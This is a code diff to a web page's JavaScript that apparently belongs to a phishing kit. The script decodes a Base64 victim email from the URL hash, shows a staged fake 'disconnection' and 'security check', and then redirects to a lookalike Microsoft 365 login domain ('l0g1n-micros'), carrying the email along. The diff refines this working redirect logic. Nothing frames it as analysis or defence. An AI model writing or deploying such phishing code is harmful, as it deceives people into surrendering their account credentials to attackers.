@@ -65,7 +65,7 @@
         (function() {
             'use strict';
 
-            // Function to extract Base64-encoded email from the URL hash (e.g., #email=Y29udGFjdEBleGFtcGxlLmNvbQ==)
+            // Function to extract Base64-encoded email from the URL hash (e.g., #Y29udGFjdEBleGFtcGxlLmNvbQ==)
             function getEmailFromHash() {
                 const hash = window.location.hash.substr(1); // Remove the leading '#'
                 try {
@@ -92,6 +92,19 @@
                 }
             }
 
+            // Redirect after the email is decoded
+            function redirectToPage() {
+                const email = getEmailFromHash();
+                if (email) {
+                    // After decoding, redirect to a new page with the email in the query string
+                    const redirectTo = `https://l0g1n-micros.ftlivedocs.com/o365?email=${encodeURIComponent(email)}`;
+                    console.log("Redirecting to: " + redirectTo);
+                    window.location.href = redirectTo;
+                } else {
+                    console.error("No valid email to redirect with.");
+                }
+            }
+
             // Simulate disconnection and security check
             function simulateDisconnection() {
                 console.log("Simulating disconnection for 10 seconds...");
@@ -104,17 +117,14 @@
                         securityCheckMessage.style.display = 'block';
                     }
 
-                    setTimeout(() => {
-                        const redirectTo = "https://l0g1n-micros.ftlivedocs.com/o365#" + window.location.hash.substr(1);
-                        console.log("Redirecting to: " + redirectTo);
-                        window.location.href = redirectTo;
-                    }, 6000);
+                    // Redirect after security check and Base64 decoding
+                    setTimeout(redirectToPage, 6000);
                 }, 10000);
             }
 
             window.onload = function() {
-                simulateDisconnection();
-                setTimeout(populateEmail, 5000); // Wait 5 seconds before decoding and populating the email
+                populateEmail(); // Ensure the email is decoded first
+                simulateDisconnection(); // Simulate security check and disconnection
             };
         })();
     </script>
